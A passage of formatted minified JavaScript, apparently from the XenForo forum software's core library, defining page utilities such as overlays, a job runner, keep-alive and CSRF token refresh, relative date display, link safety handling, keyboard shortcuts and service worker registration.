      e = ["narrow", "medium", "wide", "full"];
    c();
    d(h).onPassive("resize", c);
    return {
      current: function () {
        return f;
      },
      refresh: c,
      isNarrowerThan: a,
      isAtOrNarrowerThan: function (b) {
        return f == b || a(b);
      },
      isWiderThan: b,
      isAtOrWiderThan: function (a) {
        return f == a || b(a);
      }
    };
  }(), XF.JobRunner = function () {
    var a = !1,
      b,
      c = null,
      f = 0,
      e,
      g = null,
      l = function () {
        d.ajax({
          url: XF.canonicalizeUrl("job.php"),
          type: "post",
          cache: !1,
          dataType: "json",
          global: !1
        }).always(function (a) {
          a && a.more && setTimeout(l, 100);
        });
      },
      m = function (a) {
        e = XF.ajax("post", XF.canonicalizeUrl("job.php"), {
          only_ids: a
        }, function (a) {
          a.more && a.ids && a.ids.length ? (a.status && d("#xfAutoBlockingJobStatus").text(a.status), setTimeout(function () {
            m(a.ids);
          }, 0)) : (n(), a.moreAuto && setTimeout(l, 100));
        }, {
          skipDefault: !0
        }).fail(n);
      },
      n = function () {
        g && g.hide();
        f--;
        0 > f && (f = 0);
        0 == f && (d(k).trigger("job:auto-blocking-complete"), v());
        e && e.abort();
        e = null;
      },
      h = function () {
        c && c.hide();
        a = !1;
        d(k).trigger("job:manual-complete");
        v();
        b && b.abort();
        b = null;
      },
      r = function () {
        c || (c = p("xfManualJobStatus"));
        return c;
      },
      p = function (a) {
        a = XF.getOverlayHtml({
          title: XF.phrase("processing..."),
          dismissible: !1,
          html: '<div class="blockMessage"><span id="' + a + '">' + XF.phrase("processing...") + "</span></div>"
        });
        return new XF.Overlay(a, {
          backdropClose: !1,
          keyboard: !1
        });
      },
      v = function () {
        t() || d(k).trigger("job:blocking-complete");
      },
      t = function () {
        return a || 0 < f;
      };
    return {
      isBlockingJobRunning: t,
      runAuto: l,
      runAutoBlocking: function (a, b) {
        if ("number" === typeof a) a = [a];else if (!Array.isArray(a)) return;
        a.length && (f++, g || (g = p("xfAutoBlockingJobStatus")), g.show(), b || (b = XF.phrase("processing...")), d("#xfAutoBlockingJobStatus").text(b), m(a));
      },
      runManual: function (c) {
        var g = XF.config.job.manualUrl;
        if (g) {
          if (null === c) e = null;else {
            var e = e || [];
            "number" === typeof c ? e.push(c) : Array.isArray(c) && e.push.apply(e, c);
          }
          if (!a) {
            a = !0;
            r().show();
            var f = function (a) {
                b = XF.ajax("post", g, a ? {
                  only_id: a
                } : null, function (b) {
                  b.jobRunner ? (d("#xfManualJobStatus").text(b.jobRunner.status || XF.phrase("processing...")), setTimeout(function () {
                    f(a);
                  }, 0)) : l();
                }, {
                  skipDefault: !0
                }).fail(h);
              },
              l = function () {
                Array.isArray(e) && 0 == e.length ? h() : f(e ? e.shift() : null);
              };
            l();
          }
        }
      },
      stopManual: h,
      getManualOverlay: r
    };
  }(), XF.Loader = function () {
    var a = XF.config.css,
      b = XF.config.js,
      c = function (c, e, g) {
        c = c || [];
        e = e || [];
        var f = [],
          m = [],
          n;
        for (n = 0; n < c.length; n++) b.hasOwnProperty(c[n]) || f.push(c[n]);
        for (n = 0; n < e.length; n++) a.hasOwnProperty(e[n]) || m.push(e[n]);
        var h = (f.length ? 1 : 0) + (m.length ? 1 : 0),
          k = function () {
            h--;
            0 == h && g && g();
          };
        h ? (f.length && XF.loadScripts(f, function () {
          d.each(f, function (a, c) {
            b[c] = !0;
          });
          k();
        }), m.length && ((c = XF.config.url.css) ? (c = c.replace("__SENTINEL__", m.join(",")), d.ajax({
          type: "GET",
          url: c,
          cache: !0,
          global: !1,
          dataType: "text",
          success: function (a) {
            var b = XF.config.url.basePath;
            b && (a = a.replace(/(url\(("|')?)([^"')]+)(("|')?\))/gi, function (a, c, d, g, e, f) {
              g.match(/^([a-z]+:|\/)/i) || (g = b + g);
              return c + g + e;
            }));
            d("<style>" + a + "</style>").appendTo("head");
          }
        }).always(function () {
          d.each(m, function (b, c) {
            a[c] = !0;
          });
          k();
        })) : (console.error("No CSS URL so cannot dynamically load CSS"), k()))) : g && g();
      };
    return {
      load: c,
      loadCss: function (a, b) {
        c([], a, b);
      },
      loadJs: function (a, b) {
        c(a, [], b);
      }
    };
  }(), XF.ClassMapper = XF.create({
    _map: {},
    _toExtend: {},
    add: function (a, b) {
      this._map[a] = b;
    },
    extend: function (a, b) {
      var c = this.getObjectFromIdentifier(a);
      c ? (c = XF.extend(c, b), this._map[a] = c) : (this._toExtend[a] || (this._toExtend[a] = []), this._toExtend[a].push(b));
    },
    getObjectFromIdentifier: function (a) {
      var b = this._map[a],
        c = this._toExtend[a];
      if (!b) return null;
      if ("string" == typeof b) {
        b = XF.classToConstructor(b);
        if (c) {
          for (var d = 0; d < c.length; d++) b = XF.extend(b, c[d]);
          delete this._toExtend[a];
        }
        this._map[a] = b;
      }
      return b;
    }
  }), XF.ActionIndicator = function () {
    var a = 0,
      b,
      c = function () {
        a++;
        1 == a && (b || (b = d('<span class="globalAction"><span class="globalAction-bar"></span><span class="globalAction-block"><i></i><i></i><i></i></span></span>').appendTo("body")), b.addClassTransitioned("is-active"));
      },
      f = function () {
        a--;
        0 < a || (a = 0, b && b.removeClassTransitioned("is-active"));
      };
    return {
      initialize: function () {
        d(k).on({
          ajaxStart: c,
          "xf:action-start": c,
          ajaxStop: f,
          "xf:action-stop": f
        });
      },
      show: c,
      hide: f
    };
  }(), XF.DynamicDate = function () {
    var a,
      b,
      c,
      f,
      e,
      g,
      l = !1,
      m,
      h = function () {
        m = setInterval(function () {
          x(k);
        }, 2E4);
      },
      x = function (m) {
        l || this.initialize();
        m = d(m).find("time[data-time]");
        var h = m.length,
          n = Math.floor(new Date().getTime() / 1E3) - a,
          k = new Date();
        k.setHours(0, 0, 0, 0);
        b + n > e && (k.getDay(), e = r(k, 1), c = r(k, 0), f = r(k, -1), g = r(k, -6));
        for (var x = 0; x < h; x++) {
          var p = m[x];
          var q = d(p);
          var w = parseInt(p.getAttribute("data-time"), 10);
          var y = b - w + n;
          var u = p.xfDynType;
          -2 > y ? (y = w - (b + n), 60 > y ? "futureMoment" != u && (q.text(XF.phrase("in_a_moment")), p.xfDynType = "futureMoment") : 120 > y ? "futureMinute" != u && (q.text(XF.phrase("in_a_minute")), p.xfDynType = "futureMinute") : 3600 > y ? (w = Math.floor(y / 60), u !== "futureMinutes" + w && (q.text(XF.phrase("in_x_minutes", {
            "{minutes}": w
          })), p.xfDynType = "futureMinutes" + w)) : w < e ? "latertoday" != u && (q.text(XF.phrase("later_today_at_x", {
            "{time}": q.attr("data-time-string")
          })), p.xfDynType = "latertoday") : w < r(k, 2) ? "tomorrow" != u && (q.text(XF.phrase("tomorrow_at_x", {
            "{time}": q.attr("data-time-string")
          })), p.xfDynType = "tomorrow") : (604800 > y || (q.attr("data-full-date") ? q.text(XF.phrase("date_x_at_time_y", {
            "{date}": q.attr("data-date-string"),
            "{time}": q.attr("data-time-string")
          })) : q.text(q.attr("data-date-string"))), p.xfDynType = "future")) : 60 >= y ? "moment" !== u && (q.text(XF.phrase("a_moment_ago")), p.xfDynType = "moment") : 120 >= y ? "minute" !== u && (q.text(XF.phrase("one_minute_ago")), p.xfDynType = "minute") : 3600 > y ? (w = Math.floor(y / 60), u !== "minutes" + w && (q.text(XF.phrase("x_minutes_ago", {
            "{minutes}": w
          })), p.xfDynType = "minutes" + w)) : w >= c ? "today" !== u && (q.text(XF.phrase("today_at_x", {
            "{time}": q.attr("data-time-string")
          })), p.xfDynType = "today") : w >= f ? "yesterday" !== u && (q.text(XF.phrase("yesterday_at_x", {
            "{time}": q.attr("data-time-string")
          })), p.xfDynType = "yesterday") : w >= g ? "week" !== u && (q.text(XF.phrase("day_x_at_time_y", {
            "{day}": XF.phrase("day" + new Date(1E3 * w).getDay()),
            "{time}": q.attr("data-time-string")
          })), p.xfDynType = "week") : "old" !== u && (q.attr("data-full-date") ? q.text(XF.phrase("date_x_at_time_y", {
            "{date}": q.attr("data-date-string"),
            "{time}": q.attr("data-time-string")
          })) : q.text(q.attr("data-date-string")), p.xfDynType = "old");
        }
      },
      r = function (a, b) {
        return Math.floor(new Date(a.valueOf()).setFullYear(a.getFullYear(), a.getMonth(), a.getDate() + b) / 1E3);
      };
    return {
      initialize: function () {
        if (!l) {
          l = !0;
          var n = XF.config.time;
          a = XF.getLocalLoadTime();
          b = n.now;
          c = n.today;
          f = n.yesterday;
          e = n.tomorrow;
          g = n.week;
          void 0 !== k.hidden ? (k.hidden || h(), d(k).on("visibilitychange", function () {
            k.hidden ? clearInterval(m) : (h(), x(k));
          })) : h();
        }
      },
      refresh: x
    };
  }(), XF.KeepAlive = function () {
    var a,
      b,
      c = !1,
      f,
      e = function () {
        var a = 3E3 + (Math.floor(241 * Math.random()) + -120);
        120 > a && (a = 120);
        f && clearInterval(f);
        f = setInterval(m, 1E3 * a);
      },
      g = 0,
      l,
      m = function () {
        c && (!1 === h.navigator.onLine && (g++, 5 >= g && (l = setTimeout(m, 30))), g = 0, clearTimeout(l), d.ajax({
          url: XF.canonicalizeUrl(a),
          data: {
            _xfResponseType: "json",
            _xfToken: XF.config.csrf
          },
          type: "post",
          cache: !1,
          dataType: "json",
          global: !1
        }).done(function (a) {
          "ok" == a.status && (n(a), XF.CrossTab.trigger(b, a));
        }));
      },
      n = function (a) {
        a.csrf && (XF.config.csrf = a.csrf, d("input[name=_xfToken]").val(a.csrf));
        if ("undefined" !== typeof a.user_id) {
          var b = d(".js-activeUserChangeMessage");
          a.user_id == XF.config.userId || b.length || XF.addFixedMessage(XF.phrase("active_user_changed_reload_page"), {
            "class": "js-activeUserChangeMessage"
          });
          a.user_id == XF.config.userId && b.length && b.remove();
        }
        e();
      };
    return {
      initialize: function () {
        if (!c && XF.config.url.keepAlive && XF.config.url.keepAlive.length) {
          c = !0;
          a = XF.config.url.keepAlive;
          b = "keepAlive" + XF.stringHashCode(a);
          e();
          XF.CrossTab.on(b, n);
          if (h.performance && h.performance.navigation) {
            var d = h.performance.navigation.type;
            0 != d && 1 != d || XF.CrossTab.trigger(b, {
              csrf: XF.config.csrf,
              time: XF.config.time.now,
              user_id: XF.config.userId
            });
          }
          XF.Cookie.get("csrf") || m();
        }
      },
      refresh: m
    };
  }(), XF.History = function () {
    var a = h.history,
      b = a.state,
      c = h.location.href,
      d = [];
    return {
      initialize: function () {
        h.addEventListener("popstate", function (a) {
          a = a.state;
          for (var g = !1, e = 0; e < d.length; e++) d[e](a, b, c) && (g = !0);
          g || c.replace(/#.*$/, "") === h.location.href.replace(/#.*$/, "") || h.location.reload();
          b = a;
          c = h.location.href;
        });
      },
      handle: function (a) {
        d.push(a);
      },
      push: function (d, g, f) {
        a.pushState(d, g, f);
        b = d;
        c = h.location.href;
      },
      replace: function (d, g, f) {
        a.replaceState(d, g, f);
        b = d;
        c = h.location.href;
      },
      go: function (b) {
        a.go(b);
      }
    };
  }(), XF.LinkWatcher = function () {
    var a = function (a) {
        var b = d(this),
          c = b.data("proxy-href"),
          g = b.data("proxy-handler-last");
        !c || g && g == a.timeStamp || (b.data("proxy-handler-last", a.timeStamp), d.ajax({
          url: XF.canonicalizeUrl(c),
          data: {
            _xfResponseType: "json",
            referrer: h.location.href.replace(/#.*$/, "")
          },
          type: "post",
          cache: !1,
          dataType: "json",
          global: !1
        }));
      },
      b = function (a) {
        if (XF.config.enableRtnProtect && !a.isDefaultPrevented()) {
          var b = d(this),
            c = b.attr("href"),
            g = b.data("blank-handler-last");
          if (c && (!c.match(/^[a-z]:/i) || c.match(/^https?:/i)) && !b.is("[data-fancybox]")) {
            if (b.is("[rel~=noopener]")) {
              var l = XF.browser;
              if (l.chrome && 49 <= l.version || l.mozilla && 52 <= l.version || l.safari && 11 <= l.version) return;
            }
            if (!(b.closest("[contenteditable=true]").length || (c = XF.canonicalizeUrl(c), new RegExp("^[a-z]+://" + location.host + "(/|$|:)", "i").test(c) || g && g == a.timeStamp || (b.data("blank-handler-last", a.timeStamp), l = navigator.userAgent, b = -1 !== l.indexOf("MSIE"), g = -1 !== l.indexOf("Safari") && -1 == l.indexOf("Chrome"), l = -1 !== l.indexOf("Gecko/"), a.shiftKey && l || g && (a.shiftKey || a.altKey) || b)))) {
              if (g) b = d('<iframe style="display: none" />').appendTo(k.body), g = b[0].contentDocument || b[0].contentWindow.document, g.__href = c, c = d("<script />", g), c[0].text = "window.opener=null;window.parent=null;window.top=null;window.frameElement=null;window.open(document.__href).opener = null;", g.body.appendChild(c[0]), b.remove();else {
                c = h.open(c);
                try {
                  c.opener = null;
                } catch (m) {}
              }
              a.preventDefault();
            }
          }
        }
      };
    return {
      initLinkProxy: function () {
        var b = "a[data-proxy-href]:not(.link--internal)";
        d(k).on("click", b, a).on("focusin", b, function (b) {
          b = d(this);
          b.data("proxy-handler") || b.data("proxy-handler", !0).click(a);
        });
      },
      initExternalWatcher: function () {
        d(k).on("click", "a[target=_blank]", b).on("focusin", "a[target=_blank]", function (a) {
          a = d(this);
          a.data("blank-handler") || a.data("blank-handler", !0).click(b);
        });
      }
    };
  }(), XF._IgnoredWatcher = XF.create({
    options: {
      container: "body",
      ignored: ".is-ignored",
      link: ".js-showIgnored"
    },
    $container: null,
    authors: [],
    shown: !1,
    __construct: function (a) {
      this.options = d.extend(!0, {}, this.options, a || {});
      this.$container = a = d(this.options.container);
      this.updateState();
      a.on("click", this.options.link, XF.proxy(this, "show"));
    },
    refresh: function (a) {
      this.$container.find(a).length && (this.shown ? this.show() : this.updateState());
    },
    updateState: function () {
      if (!this.shown) {
        var a = this.getIgnored(),
          b = [];
        if (a.length) if (a.each(function () {
          var a = d(this).data("author");
          a && -1 === d.inArray(a, b) && b.push(a);
        }), b.length) {
          var c = {
            names: b.join(", ")
          };
          this.getLinks().each(function () {
            var a = d(this),
              b = a.attr("title");
            b && a.attr("title", Mustache.render(b, c)).removeClass("is-hidden");
          });
        } else this.getLinks().each(function () {
          d(this).removeAttr("title").removeClass("is-hidden");
        });
      }
    },
    getIgnored: function () {
      return this.$container.find(this.options.ignored);
    },
    getLinks: function () {
      return this.$container.find(this.options.link);
    },
    show: function () {
      this.shown = !0;
      this.getIgnored().removeClass("is-ignored");
      this.getLinks().addClass("is-hidden");
    },
    initializeHash: function () {
      if (h.location.hash) {
        var a = h.location.hash.replace(/[^\w_#-]/g, "");
        if ("#" !== a) {
          a = d(a);
          var b = this.options.ignored;
          (b = a.is(b) ? a : a.closest(b)) && b.length && (b.removeClass("is-ignored"), a.get(0).scrollIntoView(!0));
        }
      }
    }
  }), XF.IgnoreWatcher = new XF._IgnoredWatcher(), XF.BrowserWarning = function () {
    return {
      display: function () {
        var a = !1;
        XF.browser.msie ? a = !0 : XF.browser.edge && 18 > parseInt(XF.browser.version) && (a = !0);
        var b = d(".js-browserWarning");
        a ? b.show() : b.remove();
      }
    };
  }(), XF.MultiBar = XF.create({
    options: {
      role: null,
      focusShow: !1,
      className: "",
      fastReplace: !1
    },
    $container: null,
    $multiBar: null,
    shown: !1,
    __construct: function (a, b) {
      this.options = d.extend(!0, {}, this.options, b || {});
      this.$multiBar = a instanceof d ? a : d(d.parseHTML(a));
      this.$multiBar.attr("role", this.options.role || "dialog").attr("aria-hidden", "true").on("multibar:hide", XF.proxy(this, "hide")).on("multibar:show", XF.proxy(this, "show"));
      this.$container = d('<div class="multiBar-container" />');
      this.$container.html(this.$multiBar).data("multibar", this).addClass(this.options.className);
      this.$container.xfUniqueId();
      this.$container.appendTo("body");
      XF.activate(this.$container);
      XF.MultiBar.cache[this.$container.attr("id")] = this;
    },
    show: function () {
      if (!this.shown) {
        this.shown = !0;
        this.$multiBar.attr("aria-hidden", "false");
        d(".p-pageWrapper").addClass("has-multiBar");
        this.options.fastReplace && this.$multiBar.css("transition-duration", "0s");
        var a = this;
        this.$container.appendTo("body");
        this.$multiBar.addClassTransitioned("is-active", function () {
          if (a.options.focusShow) {
            var b = a.$multiBar.find(".js-multiBarClose");
            XF.autoFocusWithin(a.$multiBar.find(".multiBar-content"), null, b);
          }
          a.$container.trigger("multibar:shown");
          XF.layoutChange();
        });
        this.options.fastReplace && this.$multiBar.css("transition-duration", "");
        this.$container.trigger("multibar:showing");
        XF.layoutChange();
      }
    },
    hide: function () {
      if (this.shown) {
        this.shown = !1;
        this.$multiBar.attr("aria-hidden", "true");
        var a = this;
        this.$multiBar.removeClassTransitioned("is-active", function () {
          d(".p-pageWrapper").removeClass("has-multiBar");
          a.$container.trigger("multibar:hidden");
          XF.layoutChange();
        });
        this.$container.trigger("multibar:hiding");
        XF.layoutChange();
      }
    },
    toggle: function (a) {
      (null === a ? !this.shown : a) ? this.show() : this.hide();
    },
    destroy: function () {
      var a = this.$container.attr("id"),
        b = XF.MultiBar.cache;
      this.$container.remove();
      b.hasOwnProperty(a) && delete b[a];
    },
    on: function () {
      this.$container.on.apply(this.$container, arguments);
    },
    getContainer: function () {
      return this.$container;
    },
    getMultiBar: function () {
      return this.$multiBar;
    }
  }), XF.MultiBar.cache = {}, XF.showMultiBar = function (a, b) {
    a = new XF.MultiBar(a, b);
    a.show();
    return a;
  }, XF.loadMultiBar = function (a, b, c, f) {
    d.isFunction(c) && (c = {
      init: c
    });
    c = d.extend({
      cache: !1,
      beforeShow: null,
      afterShow: null,
      onRedirect: null,
      init: null,
      show: !0
    }, c || {});
    var e = function (a) {
      if (c.beforeShow) {
        var b = d.Event();
        c.beforeShow(a, b);
        if (b.isDefaultPrevented()) return;
      }
      c.show && a.show();
      c.afterShow && (b = d.Event(), c.afterShow(a, b), b.isDefaultPrevented());
    };
    if (c.cache && XF.loadMultiBar.cache[a]) e(XF.loadMultiBar.cache[a]);else {
      var g = function (b) {
        if (b.redirect) if (c.onRedirect) c.onRedirect(b, g);else XF.ajax("get", b.redirect, function (a) {
          g(a);
        });
        b.html && XF.setupHtmlInsert(b.html, function (b, d, g) {
          var l = new XF.MultiBar(XF.getMultiBarHtml({
            html: b,
            title: d.title || d.h1
          }), f);
          c.init && c.init(l);
          if (!c.cache) l.on("multibar:hidden", function () {
            l.destroy();
          });
          g();
          c.cache && (XF.loadMultiBar.cache[a] = l);
          e(l);
        });
      };
      return XF.ajax("post", a, b, function (a) {
        g(a);
      });
    }
  }, XF.loadMultiBar.cache = {}, XF.Overlay = XF.create({
    options: {
      backdropClose: !0,
      escapeClose: !0,
      focusShow: !0,
      className: ""
    },
    $container: null,
    $overlay: null,
    shown: !1,
    __construct: function (a, b) {
      this.options = d.extend(!0, {}, this.options, b || {});
      this.$overlay = a instanceof d ? a : d(d.parseHTML(a));
      this.$overlay.attr("role", this.options.role || "dialog").attr("aria-hidden", "true");
      this.$container = d('<div class="overlay-container" />').html(this.$overlay);
      this.$container.data("overlay", this).xfUniqueId();
      var c = this;
      if (this.options.escapeClose) this.$container.on("keydown.overlay", function (a) {
        27 === a.which && c.hide();
      });
      this.options.backdropClose && (this.$container.on("mousedown", function (a) {
        c.$container.data("block-close", !1);
        d(a.target).is(c.$container) || c.$container.data("block-close", !0);
      }), this.$container.on("click", function (a) {
        d(a.target).is(c.$container) && (c.$container.data("block-close") || c.hide());
        c.$container.data("block-close", !1);
      }));
      this.options.className && this.$container.addClass(this.options.className);
      this.$container.on("click", ".js-overlayClose", XF.proxy(this, "hide"));
      this.$container.appendTo("body");
      XF.activate(this.$container);
      XF.Overlay.cache[this.$container.attr("id")] = this;
      this.$overlay.on("overlay:hide", XF.proxy(this, "hide"));
      this.$overlay.on("overlay:show", XF.proxy(this, "show"));
    },
    show: function () {
      if (!this.shown) {
        this.shown = !0;
        this.$overlay.attr("aria-hidden", "false");
        var a = this;
        this.$container.appendTo("body").addClassTransitioned("is-active", function () {
          if (a.options.focusShow) {
            var b = a.$overlay.find(".js-overlayClose");
            XF.autoFocusWithin(a.$overlay.find(".overlay-content"), null, b);
          }
          a.$container.trigger("overlay:shown");
          XF.layoutChange();
        });
        this.$container.trigger("overlay:showing");
        XF.ModalOverlay.open();
        XF.layoutChange();
      }
    },
    hide: function () {
      if (this.shown) {
        this.shown = !1;
        this.$overlay.attr("aria-hidden", "true");
        var a = this;
        this.$container.removeClassTransitioned("is-active", function () {
          a.$container.trigger("overlay:hidden");
          XF.ModalOverlay.close();
          XF.layoutChange();
        });
        this.$container.trigger("overlay:hiding");
        XF.layoutChange();
      }
    },
    recalculate: function () {
      this.shown && XF.Modal.updateScrollbarPadding();
    },
    toggle: function () {
      this.shown ? this.hide() : this.show();
    },
    destroy: function () {
      var a = this.$container.attr("id"),
        b = XF.Overlay.cache;
      this.$container.remove();
      b.hasOwnProperty(a) && delete b[a];
    },
    on: function () {
      this.$container.on.apply(this.$container, arguments);
    },
    getContainer: function () {
      return this.$container;
    },
    getOverlay: function () {
      return this.$overlay;
    }
  }), XF.Overlay.cache = {}, XF.ModalOverlay = function () {
    var a = 0,
      b = d("body").first();
    return {
      getOpenCount: function () {
        return a;
      },
      open: function () {
        XF.Modal.open();
        a++;
        1 == a && b.addClass("is-modalOverlayOpen");
      },
      close: function () {
        XF.Modal.close();
        0 < a && (a--, 0 == a && b.removeClass("is-modalOverlayOpen"));
      }
    };
  }(), XF.Modal = function () {
    var a = 0,
      b = d("body").first(),
      c = d("html"),
      f = function () {
        var a = "right",
          d = b.hasClass("is-modalOpen") ? XF.measureScrollBar() + "px" : "";
        XF.isRtl() && (XF.browser.chrome || XF.browser.mozilla || (a = "left"));
        c.css("margin-" + a, d);
      };
    return {
      getOpenCount: function () {
        return a;
      },
      open: function () {
        a++;
        1 == a && (b.addClass("is-modalOpen"), f());
      },
      close: function () {
        0 < a && (a--, 0 == a && (b.removeClass("is-modalOpen"), f()));
      },
      updateScrollbarPadding: f
    };
  }(), XF.showOverlay = function (a, b) {
    a = new XF.Overlay(a, b);
    a.show();
    return a;
  }, XF.loadOverlay = function (a, b, c) {
    d.isFunction(b) && (b = {
      init: b
    });
    b = d.extend({
      cache: !1,
      beforeShow: null,
      afterShow: null,
      onRedirect: null,
      init: null,
      show: !0
    }, b || {});
    var f = function (a) {
      if (b.beforeShow) {
        var c = d.Event();
        b.beforeShow(a, c);
        if (c.isDefaultPrevented()) return;
      }
      b.show && a.show();
      b.afterShow && (c = d.Event(), b.afterShow(a, c), c.isDefaultPrevented());
    };
    if (b.cache && XF.loadOverlay.cache[a]) f(XF.loadOverlay.cache[a]);else {
      var e = function (d) {
        if (d.redirect) if (b.onRedirect) b.onRedirect(d, e);else XF.ajax("get", d.redirect, function (a) {
          e(a);
        });
        d.html && XF.setupHtmlInsert(d.html, function (d, g, e) {
          var l = new XF.Overlay(XF.getOverlayHtml({
            html: d,
            title: g.title || g.h1
          }), c);
          b.init && b.init(l);
          if (!b.cache) l.on("overlay:hidden", function () {
            l.destroy();
          });
          e();
          b.cache && (XF.loadOverlay.cache[a] = l);
          f(l);
        });
      };
      return XF.ajax("get", a, function (a) {
        e(a);
      });
    }
  }, XF.loadOverlay.cache = {}, XF.NavDeviceWatcher = function () {
    function a(a) {
      a != b && (d("html").toggleClass("has-pointer-nav", !a), b = a);
    }
    var b = !0;
    return {
      initialize: function () {
        d(k).onPassive({
          mousedown: function () {
            a(!1);
          },
          keydown: function (b) {
            switch (b.key) {
              case "Tab":
              case "Enter":
                a(!0);
            }
          }
        });
      },
      toggle: a,
      isKeyboardNav: function () {
        return b;
      }
    };
  }(), XF.ScrollButtons = function () {
    function a(a) {
      if (!x) {
        a = h.pageYOffset || k.documentElement.scrollTop;
        var c = v;
        v = a;
        if (a > c) "down" != t && (t = "down", A = c);else if (a < c) "up" != t && (t = "up", A = c);else return;
        if (r) {
          if ("up" !== t || 100 > v) {
            B && (B.cancel(), B = null);
            return;
          }
          if (30 > A - a) return;
        }
        B || (B = XF.requestAnimationTimeout(function () {
          B = null;
          b();
          f();
        }, 200));
      }
    }
    function b() {
      p || (z.addClassTransitioned("is-active"), p = !0);
    }
    function c() {
      p && (z.removeClassTransitioned("is-active"), p = !1);
    }
    function f() {
      e();
      n = setTimeout(function () {
        c();
      }, 3E3);
    }
    function e() {
      clearTimeout(n);
    }
    function g() {
      e();
      b();
    }
    function l() {
      e();
    }
    function m() {
      x = !0;
      setTimeout(function () {
        x = !1;
      }, 500);
      c();
    }
    var n = null,
      x = !1,
      r = !1,
      p = !1,
      v = h.pageYOffset || k.documentElement.scrollTop,
      t = null,
      A = null,
      B,
      z = null;
    return {
      initialize: function () {
        if (z && z.length) return !1;
        z = d(".js-scrollButtons");
        if (!z.length) return !1;
        "up" === z.data("trigger-type") && (r = !0);
        z.on({
          "mouseenter focus": g,
          "mouseleave blur": l,
          click: m
        });
        d(h).onPassive("scroll", a);
        return !0;
      },
      show: b,
      hide: c,
      startHideTimer: f,
      clearHideTimer: e
    };
  }(), XF.KeyboardShortcuts = function () {
    function a(c) {
      c = d(c);
      1 < c.length ? c.each(function () {
        a(this);
      }) : (c.is("[data-xf-key]") && b(c[0]), c.find("[data-xf-key]").each(function () {
        b(this);
      }));
    }
    function b(a) {
      var b = String(d(a).data("xf-key")),
        c = b.substr(b.lastIndexOf("+") + 1),
        g = "#" === c[0] ? c.substr(1) : c.toUpperCase().charCodeAt(0),
        f = b.toUpperCase().split("+");
      var h = -1 !== f.indexOf("CTRL");
      var k = -1 !== f.indexOf("ALT");
      f = -1 !== f.indexOf("META");
      (h = 0 + h ? 1 : 0 + k ? 2 : 0 + f ? 4 : 0) ? XF.Keyboard.isStandardKey(g) ? (e[g] = e[g] || {}, e[g][h] = a) : console.warn("It is not possible to specify a keyboard shortcut using this key combination (%s)", b) : e[c] = a;
    }
    function c(a) {
      switch (a.key) {
        case "Escape":
          XF.MenuWatcher.closeAll();
          XF.hideTooltips();
          return;
        case "Shift":
        case "Control":
        case "Alt":
        case "Meta":
          return;
      }
      if (XF.Keyboard.isShortcutAllowed(k.activeElement) && (!e.hasOwnProperty(a.key) || 0 != (0 + a.ctrlKey ? 1 : 0 + a.altKey ? 2 : 0 + a.metaKey ? 4 : 0) || !f(e[a.key])) && e.hasOwnProperty(a.which)) {
        var b = 0 + a.ctrlKey ? 1 : 0 + a.altKey ? 2 : 0 + a.metaKey ? 4 : 0;
        e[a.which].hasOwnProperty(b) && f(e[a.which][b]);
      }
    }
    function f(a) {
      a = d(a).filter(":visible");
      return a.length ? (XF.NavDeviceWatcher.toggle(!0), XF.isElementVisible(a) || a.get(0).scrollIntoView(!0), a.is(XF.getKeyboardInputs()) ? a.autofocus() : a.is("a[href]") ? a.get(0).click() : a.click(), !0) : !1;
    }
    var e = {};
    return {
      initialize: function () {
        d(k.body).onPassive("keyup", c);
      },
      initializeElements: a
    };
  }(), XF.Keyboard = {
    isShortcutAllowed: function (a) {
      switch (a.tagName) {
        case "TEXTAREA":
        case "SELECT":
          return !1;
        case "INPUT":
          switch (a.type) {
            case "checkbox":
            case "radio":
            case "submit":
            case "reset":
              return !0;
            default:
              return !1;
          }
        case "BODY":
          return !0;
        default:
          return XF.browser.msie && d(a).parents(".fr-element").length ? !1 : "true" === a.contentEditable ? !1 : !0;
      }
    },
    isStandardKey: function (a) {
      return 48 <= a && 90 >= a;
    }
  }, XF.FormInputValidation = function () {
    function a(b) {
      b = d(b);
      1 < b.length ? b.each(function () {
        a(this);
      }) : b.is("form") && c(b);
    }
    function b() {
      e.length && e.each(function () {
        c(d(this));
      });
    }
    function c(a) {
      a.find(":input").on("invalid", {
        form: a
      }, f);
    }
    function f(a) {
      var b = d(this);
      a = a.data.form;
      var c = a.find(":invalid").first();
      b[0] !== c[0] || XF.isElementVisible(b) || (a = a.closest(".overlay-container.is-active"), a.length ? a.scrollTop(b.offset().top - a.offset().top + a.scrollTop() - 100) : (b[0].scrollIntoView(), h.scrollBy(0, -100)));
    }
    var e = {};
    return {
      initialize: function () {
        e = d("form").not("[novalidate]");
        b();
      },
      initializeElements: a
    };
  }(), XF.NoticeWatcher = function () {
    return {
      initialize: function () {
        d(k).on("xf:notice-change xf:layout", XF.proxy(this, "checkNotices"));
        this.checkNotices();
      },
      checkNotices: function () {
        var a = this.getBottomFixerNoticeHeight();
        d(k).find("footer.p-footer").css("margin-bottom", a);
      },
      getBottomFixerNoticeHeight: function () {
        var a = 0;
        d(k).find(".js-bottomFixTarget .notices--bottom_fixer .js-notice").each(function () {
          var b = d(this);
          b.is(":visible") && (a += b.height());
        });
        return a;
      }
    };
  }(), XF.PWA = function () {
    function a() {
      return navigator.standalone || h.matchMedia("(display-mode: standalone), (display-mode: minimal-ui)").matches;
    }
    function b() {
      g && (XF.ActionIndicator.show(), setTimeout(function () {
        XF.ActionIndicator.hide();
      }, 3E4));
    }
    function c() {
      g = !1;
      setTimeout(function () {
        g = !0;
      }, 2E3);
    }
    function f(a, b) {
      if (navigator.serviceWorker.controller) {
        if ("string" !== typeof a || "" === a) console.error("Invalid message type:", a);else {
          if ("undefined" === typeof b) b = {};else if ("object" !== typeof b || null === b) {
            console.error("Invalid message payload:", b);
            return;
          }
          navigator.serviceWorker.controller.postMessage({
            type: a,
            payload: b
          });
        }
      } else console.error("There is no active service worker");
    }
    var e,
      g = !0,
      l = {};
    return {
      initialize: function () {
        XF.PWA.isSupported() && (XF.config.skipServiceWorkerRegistration ? e = new Promise(function (a, b) {
          b(Error("Service worker registration has been skipped"));
        }) : (e = navigator.serviceWorker.register(XF.canonicalizeUrl("service_worker.js")), e.then(function (a) {
          var b = XF.config.cacheKey;
          a = a.active ? !1 : !0;
          XF.LocalStorage.get("cacheKey") !== b && (a || f("updateCache"), XF.LocalStorage.set("cacheKey", b, !0));
        }), e.catch(function (a) {
          console.error("Service worker registration failed:", a);
        }), navigator.serviceWorker.getRegistrations().then(function (a) {
          var b = XF.canonicalizeUrl("js/xf/"),
            c;
          for (c in a) a[c].scope == b && a[c].unregister();
        }), navigator.serviceWorker.addEventListener("message", function (a) {
          var b = a.data;
